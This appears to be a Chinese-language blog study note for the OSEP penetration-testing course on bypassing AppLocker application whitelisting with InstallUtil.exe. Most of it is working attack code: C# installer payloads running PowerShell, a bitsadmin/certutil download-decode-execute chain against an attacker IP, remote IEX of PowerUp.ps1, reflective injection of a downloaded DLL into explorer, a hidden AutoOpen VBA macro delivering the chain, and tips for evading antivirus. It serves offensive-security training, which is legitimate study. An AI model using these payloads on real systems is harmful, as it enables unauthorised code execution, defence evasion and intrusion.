---
title: OSEP-09-InstallUtil绕过详解
description: '09-应用白名单绕过 | 03-InstallUtil绕过详解'
pubDate: 2026-01-30T00:01:30+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# InstallUtil绕过AppLocker - 详细指南

## 概述

InstallUtil.exe是.NET Framework的安装工具,位于白名单目录中。我们可以利用它来绕过AppLocker执行任意C#代码。

---

## 第一部分:理解InstallUtil

### 1.1 什么是InstallUtil?

InstallUtil.exe是用于安装和卸载.NET程序集的命令行工具。

**位置:**
- 32位: `C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe`
- 64位: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe`

### 1.2 为什么可以利用它?

1. 位于白名单目录(C:\Windows)
2. 由Microsoft签名
3. 可以加载并执行任意.NET程序集
4. Uninstall方法不需要管理员权限

---

## 第二部分:创建绕过程序

### 2.1 基本框架

```csharp
using System;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            // 这里的代码在直接运行时执行
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // 这里的代码通过InstallUtil执行
            // 放置恶意代码
        }
    }
}
```

### 2.2 关键点说明

| 组件 | 说明 |
|------|------|
| `Main` | 直接运行时执行,可作为诱饵 |
| `[RunInstaller(true)]` | 标记类为安装程序 |
| `Uninstall` | 通过InstallUtil /U调用 |

---

## 第三部分:结合自定义Runspace

### 3.1 完整代码

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // 创建自定义Runspace
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);
            ps.Invoke();

            rs.Close();
        }
    }
}
```

### 3.2 添加程序集引用

在Visual Studio中需要添加两个引用:
1. `System.Management.Automation` - 从GAC添加
2. `System.Configuration.Install` - 从Assemblies添加

---

## 第四部分:执行绕过

### 4.1 直接执行(被阻止)

```cmd
C:\Users\student>C:\Tools\Bypass.exe
This program is blocked by group policy. For more information, contact your system administrator.
```

### 4.2 通过InstallUtil执行(成功)

```cmd
C:\Users\student>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.3752.0
Copyright (C) Microsoft Corporation.  All rights reserved.
```

### 4.3 参数说明

| 参数 | 说明 |
|------|------|
| `/logfile=` | 不写入日志文件 |
| `/LogToConsole=false` | 不输出到控制台 |
| `/U` | 调用Uninstall方法 |

---

## 第五部分:完整攻击链

### 5.1 下载、解码、执行

**步骤1: 在攻击机上Base64编码**

```cmd
certutil -encode Bypass.exe file.txt
```

**步骤2: 在目标机上下载**

```cmd
bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt
```

**步骤3: 解码**

```cmd
certutil -decode enc.txt Bypass.exe
```

**步骤4: 执行**

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe
```

### 5.2 一行命令

```cmd
bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```

---

## 第六部分:实战应用

### 6.1 下载执行PowerShell脚本

```csharp
public override void Uninstall(System.Collections.IDictionary savedState)
{
    String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";

    Runspace rs = RunspaceFactory.CreateRunspace();
    rs.Open();
    PowerShell ps = PowerShell.Create();
    ps.Runspace = rs;
    ps.AddScript(cmd);
    ps.Invoke();
    rs.Close();
}
```

### 6.2 反射式DLL注入

```csharp
public override void Uninstall(System.Collections.IDictionary savedState)
{
    String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');" +
                 "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX;" +
                 "$procid = (Get-Process -Name explorer).Id;" +
                 "Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";

    Runspace rs = RunspaceFactory.CreateRunspace();
    rs.Open();
    PowerShell ps = PowerShell.Create();
    ps.Runspace = rs;
    ps.AddScript(cmd);
    ps.Invoke();
    rs.Close();
}
```

---

## 第七部分:与VBA宏结合

### 7.1 VBA宏代码

```vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\public\enc.txt && " & _
          "certutil -decode C:\users\public\enc.txt C:\users\public\Bypass.exe && " & _
          "del C:\users\public\enc.txt && " & _
          "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\public\Bypass.exe"

    Shell cmd, vbHide
End Sub
```

---

## 常见问题

### Q1: 如果InstallUtil被阻止怎么办?

可以尝试其他LOLBAS工具:
- MSBuild.exe
- RegAsm.exe
- RegSvcs.exe

### Q2: 如何避免杀软检测?

1. 使用Base64编码传输
2. 混淆C#代码
3. 使用自定义加密

### Q3: 32位和64位有什么区别?

- 32位InstallUtil只能加载32位程序集
- 64位InstallUtil只能加载64位程序集
- 确保编译时选择正确的平台

---

## 练习

1. 创建基本的InstallUtil绕过程序
2. 添加自定义Runspace执行PowerShell
3. 实现完整的下载-解码-执行链
4. 将绕过集成到VBA宏中
